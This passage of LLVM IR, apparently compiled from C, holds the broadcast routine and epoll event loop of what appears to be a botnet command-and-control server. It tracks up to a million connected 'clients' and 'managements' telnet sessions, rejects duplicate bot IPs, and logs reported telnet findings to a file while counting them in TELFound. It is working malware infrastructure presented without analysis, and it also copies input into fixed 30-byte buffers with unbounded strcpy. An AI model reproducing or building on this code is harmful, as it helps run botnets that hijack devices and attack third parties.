  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca [1024 x i8*], align 16
  %21 = alloca [1024 x i8*], align 16
  %22 = alloca [1024 x i8*], align 16
  %23 = alloca [1024 x i8*], align 16
  %24 = alloca i8*, align 8
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  store i32 1, i32* %13, align 4
  %25 = load i8*, i8** %7, align 8
  %26 = call i32 @strcmp(i8* %25, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.9, i64 0, i64 0)) #9
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %29

28:                                               ; preds = %6
  store i32 0, i32* %13, align 4
  br label %29

29:                                               ; preds = %28, %6
  %30 = load i8*, i8** %7, align 8
  %31 = call i64 @strlen(i8* %30) #9
  %32 = add i64 %31, 10
  %33 = call noalias align 16 i8* @malloc(i64 %32) #8
  store i8* %33, i8** %14, align 8
  %34 = load i8*, i8** %14, align 8
  %35 = load i8*, i8** %7, align 8
  %36 = call i64 @strlen(i8* %35) #9
  %37 = add i64 %36, 10
  call void @llvm.memset.p0i8.i64(i8* align 1 %34, i8 0, i64 %37, i1 false)
  %38 = load i8*, i8** %14, align 8
  %39 = load i8*, i8** %7, align 8
  %40 = call i8* @strcpy(i8* %38, i8* %39) #8
  %41 = load i8*, i8** %14, align 8
  call void @trim(i8* %41)
  %42 = call i64 @time(i64* %15) #8
  %43 = call %struct.tm* @localtime(i64* %15) #8
  store %struct.tm* %43, %struct.tm** %16, align 8
  %44 = load %struct.tm*, %struct.tm** %16, align 8
  %45 = call i8* @asctime(%struct.tm* %44) #8
  store i8* %45, i8** %17, align 8
  %46 = load i8*, i8** %17, align 8
  call void @trim(i8* %46)
  store i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.10, i64 0, i64 0), i8** %18, align 8
  store i32 0, i32* %19, align 4
  br label %47

47:                                               ; preds = %204, %29
  %48 = load i32, i32* %19, align 4
  %49 = load i32, i32* %11, align 4
  %50 = icmp slt i32 %48, %49
  br i1 %50, label %51, label %207

51:                                               ; preds = %47
  %52 = load i32, i32* %19, align 4
  %53 = load i32, i32* %8, align 4
  %54 = icmp eq i32 %52, %53
  br i1 %54, label %72, label %55

55:                                               ; preds = %51
  %56 = load i32, i32* %19, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %57
  %59 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %58, i32 0, i32 2
  %60 = load i8, i8* %59, align 1
  %61 = icmp ne i8 %60, 0
  br i1 %61, label %73, label %62

62:                                               ; preds = %55
  %63 = load i32, i32* %13, align 4
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %72, label %65

65:                                               ; preds = %62
  %66 = load i32, i32* %19, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %67
  %69 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %68, i32 0, i32 1
  %70 = load i32, i32* %69, align 4
  %71 = icmp ne i32 %70, 0
  br i1 %71, label %73, label %72

72:                                               ; preds = %65, %62, %51
  br label %204

73:                                               ; preds = %65, %55
  %74 = load i32, i32* %10, align 4
  %75 = icmp eq i32 %74, 1
  br i1 %75, label %76, label %93

76:                                               ; preds = %73
  %77 = getelementptr inbounds [1024 x i8*], [1024 x i8*]* %20, i64 0, i64 0
  %78 = bitcast i8** %77 to i8*
  %79 = load i8*, i8** %9, align 8
  %80 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %78, i64 8192, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.11, i64 0, i64 0), i8* %79) #8
  %81 = load i32, i32* %19, align 4
  %82 = getelementptr inbounds [1024 x i8*], [1024 x i8*]* %20, i64 0, i64 0
  %83 = bitcast i8** %82 to i8*
  %84 = getelementptr inbounds [1024 x i8*], [1024 x i8*]* %20, i64 0, i64 0
  %85 = bitcast i8** %84 to i8*
  %86 = call i64 @strlen(i8* %85) #9
  %87 = call i64 @send(i32 %81, i8* %83, i64 %86, i32 16384)
  %88 = load i32, i32* %19, align 4
  %89 = load i8*, i8** %18, align 8
  %90 = load i8*, i8** %18, align 8
  %91 = call i64 @strlen(i8* %90) #9
  %92 = call i64 @send(i32 %88, i8* %89, i64 %91, i32 16384)
  br label %203

93:                                               ; preds = %73
  %94 = load i32, i32* %10, align 4
  %95 = icmp eq i32 %94, 3
  br i1 %95, label %96, label %113

96:                                               ; preds = %93
  %97 = getelementptr inbounds [1024 x i8*], [1024 x i8*]* %21, i64 0, i64 0
  %98 = bitcast i8** %97 to i8*
  %99 = load i8*, i8** %9, align 8
  %100 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %98, i64 8192, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.11, i64 0, i64 0), i8* %99) #8
  %101 = load i32, i32* %19, align 4
  %102 = getelementptr inbounds [1024 x i8*], [1024 x i8*]* %21, i64 0, i64 0
  %103 = bitcast i8** %102 to i8*
  %104 = getelementptr inbounds [1024 x i8*], [1024 x i8*]* %21, i64 0, i64 0
  %105 = bitcast i8** %104 to i8*
  %106 = call i64 @strlen(i8* %105) #9
  %107 = call i64 @send(i32 %101, i8* %103, i64 %106, i32 16384)
  %108 = load i32, i32* %19, align 4
  %109 = load i8*, i8** %18, align 8
  %110 = load i8*, i8** %18, align 8
  %111 = call i64 @strlen(i8* %110) #9
  %112 = call i64 @send(i32 %108, i8* %109, i64 %111, i32 16384)
  br label %202

113:                                              ; preds = %93
  %114 = load i32, i32* %10, align 4
  %115 = icmp eq i32 %114, 2
  br i1 %115, label %116, label %133

116:                                              ; preds = %113
  %117 = getelementptr inbounds [1024 x i8*], [1024 x i8*]* %22, i64 0, i64 0
  %118 = bitcast i8** %117 to i8*
  %119 = load i8*, i8** %9, align 8
  %120 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %118, i64 8192, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.12, i64 0, i64 0), i8* %119) #8
  %121 = load i32, i32* %19, align 4
  %122 = getelementptr inbounds [1024 x i8*], [1024 x i8*]* %22, i64 0, i64 0
  %123 = bitcast i8** %122 to i8*
  %124 = getelementptr inbounds [1024 x i8*], [1024 x i8*]* %22, i64 0, i64 0
  %125 = bitcast i8** %124 to i8*
  %126 = call i64 @strlen(i8* %125) #9
  %127 = call i64 @send(i32 %121, i8* %123, i64 %126, i32 16384)
  %128 = load i32, i32* %19, align 4
  %129 = load i8*, i8** %18, align 8
  %130 = load i8*, i8** %18, align 8
  %131 = call i64 @strlen(i8* %130) #9
  %132 = call i64 @send(i32 %128, i8* %129, i64 %131, i32 16384)
  br label %201

133:                                              ; preds = %113
  %134 = load i32, i32* %10, align 4
  %135 = icmp eq i32 %134, 4
  br i1 %135, label %136, label %153

136:                                              ; preds = %133
  %137 = getelementptr inbounds [1024 x i8*], [1024 x i8*]* %23, i64 0, i64 0
  %138 = bitcast i8** %137 to i8*
  %139 = load i8*, i8** %9, align 8
  %140 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %138, i64 8192, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.12, i64 0, i64 0), i8* %139) #8
  %141 = load i32, i32* %19, align 4
  %142 = getelementptr inbounds [1024 x i8*], [1024 x i8*]* %23, i64 0, i64 0
  %143 = bitcast i8** %142 to i8*
  %144 = getelementptr inbounds [1024 x i8*], [1024 x i8*]* %23, i64 0, i64 0
  %145 = bitcast i8** %144 to i8*
  %146 = call i64 @strlen(i8* %145) #9
  %147 = call i64 @send(i32 %141, i8* %143, i64 %146, i32 16384)
  %148 = load i32, i32* %19, align 4
  %149 = load i8*, i8** %18, align 8
  %150 = load i8*, i8** %18, align 8
  %151 = call i64 @strlen(i8* %150) #9
  %152 = call i64 @send(i32 %148, i8* %149, i64 %151, i32 16384)
  br label %200

153:                                              ; preds = %133
  %154 = load i32, i32* %13, align 4
  %155 = icmp ne i32 %154, 0
  br i1 %155, label %156, label %173

156:                                              ; preds = %153
  %157 = load i32, i32* %19, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %158
  %160 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %159, i32 0, i32 1
  %161 = load i32, i32* %160, align 4
  %162 = icmp ne i32 %161, 0
  br i1 %162, label %163, label %173

163:                                              ; preds = %156
  %164 = load i32, i32* %19, align 4
  %165 = call i64 @send(i32 %164, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.13, i64 0, i64 0), i64 5, i32 16384)
  %166 = load i32, i32* %19, align 4
  %167 = load i8*, i8** %9, align 8
  %168 = load i8*, i8** %9, align 8
  %169 = call i64 @strlen(i8* %168) #9
  %170 = call i64 @send(i32 %166, i8* %167, i64 %169, i32 16384)
  %171 = load i32, i32* %19, align 4
  %172 = call i64 @send(i32 %171, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i64 0, i64 0), i64 2, i32 16384)
  br label %173

173:                                              ; preds = %163, %156, %153
  %174 = load i32, i32* %19, align 4
  %175 = load i8*, i8** %7, align 8
  %176 = load i8*, i8** %7, align 8
  %177 = call i64 @strlen(i8* %176) #9
  %178 = call i64 @send(i32 %174, i8* %175, i64 %177, i32 16384)
  %179 = load i32, i32* %19, align 4
  %180 = call i64 @send(i32 %179, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.15, i64 0, i64 0), i64 5, i32 16384)
  store i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.16, i64 0, i64 0), i8** %24, align 8
  %181 = load i32, i32* %13, align 4
  %182 = icmp ne i32 %181, 0
  br i1 %182, label %183, label %196

183:                                              ; preds = %173
  %184 = load i32, i32* %19, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %185
  %187 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %186, i32 0, i32 1
  %188 = load i32, i32* %187, align 4
  %189 = icmp ne i32 %188, 0
  br i1 %189, label %190, label %196

190:                                              ; preds = %183
  %191 = load i32, i32* %19, align 4
  %192 = load i8*, i8** %24, align 8
  %193 = load i8*, i8** %24, align 8
  %194 = call i64 @strlen(i8* %193) #9
  %195 = call i64 @send(i32 %191, i8* %192, i64 %194, i32 16384)
  br label %199

196:                                              ; preds = %183, %173
  %197 = load i32, i32* %19, align 4
  %198 = call i64 @send(i32 %197, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.17, i64 0, i64 0), i64 1, i32 16384)
  br label %199

199:                                              ; preds = %196, %190
  br label %200

200:                                              ; preds = %199, %136
  br label %201

201:                                              ; preds = %200, %116
  br label %202

202:                                              ; preds = %201, %96
  br label %203

203:                                              ; preds = %202, %76
  br label %204

204:                                              ; preds = %203, %72
  %205 = load i32, i32* %19, align 4
  %206 = add nsw i32 %205, 1
  store i32 %206, i32* %19, align 4
  br label %47, !llvm.loop !15

207:                                              ; preds = %47
  %208 = load i8*, i8** %14, align 8
  call void @free(i8* %208) #8
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8*, i8*) #3

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #2

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #5

; Function Attrs: nounwind
declare i64 @time(i64*) #2

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #2

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #2

; Function Attrs: nounwind
declare i32 @snprintf(i8*, i64, i8*, ...) #2

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: nounwind
declare void @free(i8*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @get_host(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  %5 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %4, i32* %5, align 4
  %6 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %7 = load i32, i32* %6, align 4
  %8 = call i8* @inet_ntoa(i32 %7) #8
  ret i8* %8
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @epollEventLoop(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.epoll_event, align 1
  %4 = alloca %struct.epoll_event*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr, align 2
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.clientdata_t*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i64, align 8
  %17 = alloca [2048 x i8], align 16
  %18 = alloca i8*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca [60 x i8], align 16
  store i8* %0, i8** %2, align 8
  %21 = call noalias align 16 i8* @calloc(i64 1000000, i64 12) #8
  %22 = bitcast i8* %21 to %struct.epoll_event*
  store %struct.epoll_event* %22, %struct.epoll_event** %4, align 8
  br label %23

23:                                               ; preds = %1, %322
  %24 = load volatile i32, i32* @epollFD, align 4
  %25 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %26 = call i32 @epoll_wait(i32 %24, %struct.epoll_event* %25, i32 1000000, i32 -1)
  store i32 %26, i32* %6, align 4
  store i32 0, i32* %7, align 4
  br label %27

27:                                               ; preds = %319, %23
  %28 = load i32, i32* %7, align 4
  %29 = load i32, i32* %6, align 4
  %30 = icmp slt i32 %28, %29
  br i1 %30, label %31, label %322

31:                                               ; preds = %27
  %32 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %33 = load i32, i32* %7, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %32, i64 %34
  %36 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %35, i32 0, i32 0
  %37 = load i32, i32* %36, align 1
  %38 = and i32 %37, 8
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %58, label %40

40:                                               ; preds = %31
  %41 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %41, i64 %43
  %45 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %44, i32 0, i32 0
  %46 = load i32, i32* %45, align 1
  %47 = and i32 %46, 16
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %58, label %49

49:                                               ; preds = %40
  %50 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %50, i64 %52
  %54 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %53, i32 0, i32 0
  %55 = load i32, i32* %54, align 1
  %56 = and i32 %55, 1
  %57 = icmp ne i32 %56, 0
  br i1 %57, label %77, label %58

58:                                               ; preds = %49, %40, %31
  %59 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %60 = load i32, i32* %7, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %59, i64 %61
  %63 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %62, i32 0, i32 1
  %64 = bitcast %union.epoll_data* %63 to i32*
  %65 = load i32, i32* %64, align 1
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %66
  %68 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %67, i32 0, i32 2
  store i8 0, i8* %68, align 1
  %69 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %70 = load i32, i32* %7, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %69, i64 %71
  %73 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %72, i32 0, i32 1
  %74 = bitcast %union.epoll_data* %73 to i32*
  %75 = load i32, i32* %74, align 1
  %76 = call i32 @close(i32 %75)
  br label %319

77:                                               ; preds = %49
  %78 = load volatile i32, i32* @listenFD, align 4
  %79 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %80 = load i32, i32* %7, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %79, i64 %81
  %83 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %82, i32 0, i32 1
  %84 = bitcast %union.epoll_data* %83 to i32*
  %85 = load i32, i32* %84, align 1
  %86 = icmp eq i32 %78, %85
  br i1 %86, label %87, label %186

87:                                               ; preds = %77
  br label %88

88:                                               ; preds = %87, %151, %154, %178
  store i32 16, i32* %9, align 4
  %89 = load volatile i32, i32* @listenFD, align 4
  %90 = call i32 @accept(i32 %89, %struct.sockaddr* %8, i32* %9)
  store i32 %90, i32* %10, align 4
  %91 = load i32, i32* %10, align 4
  %92 = icmp eq i32 %91, -1
  br i1 %92, label %93, label %103

93:                                               ; preds = %88
  %94 = call i32* @__errno_location() #10
  %95 = load i32, i32* %94, align 4
  %96 = icmp eq i32 %95, 11
  br i1 %96, label %101, label %97

97:                                               ; preds = %93
  %98 = call i32* @__errno_location() #10
  %99 = load i32, i32* %98, align 4
  %100 = icmp eq i32 %99, 11
  br i1 %100, label %101, label %102

101:                                              ; preds = %97, %93
  br label %185

102:                                              ; preds = %97
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.18, i64 0, i64 0))
  br label %185

103:                                              ; preds = %88
  %104 = bitcast %struct.sockaddr* %8 to %struct.sockaddr_in*
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %104, i32 0, i32 2
  %106 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %105, i32 0, i32 0
  %107 = load i32, i32* %106, align 2
  %108 = load i32, i32* %10, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %109
  %111 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %110, i32 0, i32 0
  store i32 %107, i32* %111, align 4
  store i32 0, i32* %12, align 4
  store i32 0, i32* %11, align 4
  br label %112

112:                                              ; preds = %141, %103
  %113 = load i32, i32* %11, align 4
  %114 = icmp slt i32 %113, 1000000
  br i1 %114, label %115, label %144

115:                                              ; preds = %112
  %116 = load i32, i32* %11, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %117
  %119 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %118, i32 0, i32 2
  %120 = load i8, i8* %119, align 1
  %121 = icmp ne i8 %120, 0
  br i1 %121, label %122, label %126

122:                                              ; preds = %115
  %123 = load i32, i32* %11, align 4
  %124 = load i32, i32* %10, align 4
  %125 = icmp eq i32 %123, %124
  br i1 %125, label %126, label %127

126:                                              ; preds = %122, %115
  br label %141

127:                                              ; preds = %122
  %128 = load i32, i32* %11, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %129
  %131 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %130, i32 0, i32 0
  %132 = load i32, i32* %131, align 4
  %133 = load i32, i32* %10, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %134
  %136 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %135, i32 0, i32 0
  %137 = load i32, i32* %136, align 4
  %138 = icmp eq i32 %132, %137
  br i1 %138, label %139, label %140

139:                                              ; preds = %127
  store i32 1, i32* %12, align 4
  br label %144

140:                                              ; preds = %127
  br label %141

141:                                              ; preds = %140, %126
  %142 = load i32, i32* %11, align 4
  %143 = add nsw i32 %142, 1
  store i32 %143, i32* %11, align 4
  br label %112, !llvm.loop !16

144:                                              ; preds = %139, %112
  %145 = load i32, i32* %12, align 4
  %146 = icmp ne i32 %145, 0
  br i1 %146, label %147, label %157

147:                                              ; preds = %144
  %148 = load i32, i32* %10, align 4
  %149 = call i64 @send(i32 %148, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.19, i64 0, i64 0), i64 11, i32 16384)
  %150 = icmp eq i64 %149, -1
  br i1 %150, label %151, label %154

151:                                              ; preds = %147
  %152 = load i32, i32* %10, align 4
  %153 = call i32 @close(i32 %152)
  br label %88

154:                                              ; preds = %147
  %155 = load i32, i32* %10, align 4
  %156 = call i32 @close(i32 %155)
  br label %88

157:                                              ; preds = %144
  %158 = load i32, i32* %10, align 4
  %159 = call i32 @make_socket_non_blocking(i32 %158)
  store i32 %159, i32* %5, align 4
  %160 = load i32, i32* %5, align 4
  %161 = icmp eq i32 %160, -1
  br i1 %161, label %162, label %165

162:                                              ; preds = %157
  %163 = load i32, i32* %10, align 4
  %164 = call i32 @close(i32 %163)
  br label %185

165:                                              ; preds = %157
  %166 = load i32, i32* %10, align 4
  %167 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 1
  %168 = bitcast %union.epoll_data* %167 to i32*
  store i32 %166, i32* %168, align 1
  %169 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 0
  store i32 -2147483647, i32* %169, align 1
  %170 = load volatile i32, i32* @epollFD, align 4
  %171 = load i32, i32* %10, align 4
  %172 = call i32 @epoll_ctl(i32 %170, i32 1, i32 %171, %struct.epoll_event* %3) #8
  store i32 %172, i32* %5, align 4
  %173 = load i32, i32* %5, align 4
  %174 = icmp eq i32 %173, -1
  br i1 %174, label %175, label %178

175:                                              ; preds = %165
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.20, i64 0, i64 0))
  %176 = load i32, i32* %10, align 4
  %177 = call i32 @close(i32 %176)
  br label %185

178:                                              ; preds = %165
  %179 = load i32, i32* %10, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %180
  %182 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %181, i32 0, i32 2
  store i8 1, i8* %182, align 1
  %183 = load i32, i32* %10, align 4
  %184 = call i64 @send(i32 %183, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.21, i64 0, i64 0), i64 13, i32 16384)
  br label %88

185:                                              ; preds = %175, %162, %102, %101
  br label %319

186:                                              ; preds = %77
  %187 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %188 = load i32, i32* %7, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %187, i64 %189
  %191 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %190, i32 0, i32 1
  %192 = bitcast %union.epoll_data* %191 to i32*
  %193 = load i32, i32* %192, align 1
  store i32 %193, i32* %13, align 4
  %194 = load i32, i32* %13, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %195
  store %struct.clientdata_t* %196, %struct.clientdata_t** %14, align 8
  store i32 0, i32* %15, align 4
  %197 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %198 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %197, i32 0, i32 2
  store i8 1, i8* %198, align 1
  br label %199

199:                                              ; preds = %186, %296
  %200 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %200, i8 0, i64 2048, i1 false)
  br label %201

201:                                              ; preds = %281, %248, %233, %227, %199
  %202 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %202, i8 0, i64 2048, i1 false)
  %203 = icmp ne i8* %202, null
  br i1 %203, label %204, label %210

204:                                              ; preds = %201
  %205 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %206 = load i32, i32* %13, align 4
  %207 = call i32 @fdgets(i8* %205, i32 2048, i32 %206)
  %208 = sext i32 %207 to i64
  store i64 %208, i64* %16, align 8
  %209 = icmp sgt i64 %208, 0
  br label %210

210:                                              ; preds = %204, %201
  %211 = phi i1 [ false, %201 ], [ %209, %204 ]
  br i1 %211, label %212, label %282

212:                                              ; preds = %210
  %213 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %214 = call i8* @strstr(i8* %213, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.17, i64 0, i64 0)) #9
  %215 = icmp eq i8* %214, null
  br i1 %215, label %216, label %217

216:                                              ; preds = %212
  store i32 1, i32* %15, align 4
  br label %282

217:                                              ; preds = %212
  %218 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @trim(i8* %218)
  %219 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %220 = call i32 @strcmp(i8* %219, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.9, i64 0, i64 0)) #9
  %221 = icmp eq i32 %220, 0
  br i1 %221, label %222, label %228

222:                                              ; preds = %217
  %223 = load i32, i32* %13, align 4
  %224 = call i64 @send(i32 %223, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.22, i64 0, i64 0), i64 5, i32 16384)
  %225 = icmp eq i64 %224, -1
  br i1 %225, label %226, label %227

226:                                              ; preds = %222
  store i32 1, i32* %15, align 4
  br label %282

227:                                              ; preds = %222
  br label %201, !llvm.loop !17

228:                                              ; preds = %217
  %229 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %230 = call i8* @strstr(i8* %229, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.23, i64 0, i64 0)) #9
  %231 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %232 = icmp eq i8* %230, %231
  br i1 %232, label %233, label %244

233:                                              ; preds = %228
  %234 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %235 = call i8* @strstr(i8* %234, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.23, i64 0, i64 0)) #9
  %236 = getelementptr inbounds i8, i8* %235, i64 7
  store i8* %236, i8** %18, align 8
  %237 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %238 = load i8*, i8** %18, align 8
  %239 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %237, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.24, i64 0, i64 0), i8* %238)
  %240 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %241 = call i32 @fflush(%struct._IO_FILE* %240)
  %242 = load volatile i32, i32* @TELFound, align 4
  %243 = add nsw i32 %242, 1
  store volatile i32 %243, i32* @TELFound, align 4
  br label %201, !llvm.loop !17

244:                                              ; preds = %228
  %245 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %246 = call i32 @strcmp(i8* %245, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.25, i64 0, i64 0)) #9
  %247 = icmp eq i32 %246, 0
  br i1 %247, label %248, label %249

248:                                              ; preds = %244
  br label %201, !llvm.loop !17

249:                                              ; preds = %244
  %250 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %251 = call i8* @strstr(i8* %250, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.26, i64 0, i64 0)) #9
  %252 = icmp ne i8* %251, null
  br i1 %252, label %253, label %278

253:                                              ; preds = %249
  %254 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %255 = call i8* @strstr(i8* %254, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.26, i64 0, i64 0)) #9
  %256 = getelementptr inbounds i8, i8* %255, i64 5
  store i8* %256, i8** %19, align 8
  %257 = load i8*, i8** %19, align 8
  %258 = call i8* @strcpy(i8* getelementptr inbounds ([1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 0, i32 3, i64 0), i8* %257) #8
  %259 = load i32, i32* %13, align 4
  %260 = sext i32 %259 to i64
  %261 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %260
  %262 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %261, i32 0, i32 3
  %263 = getelementptr inbounds [30 x i8], [30 x i8]* %262, i64 0, i64 0
  %264 = load i8*, i8** %19, align 8
  %265 = call i8* @strcpy(i8* %263, i8* %264) #8
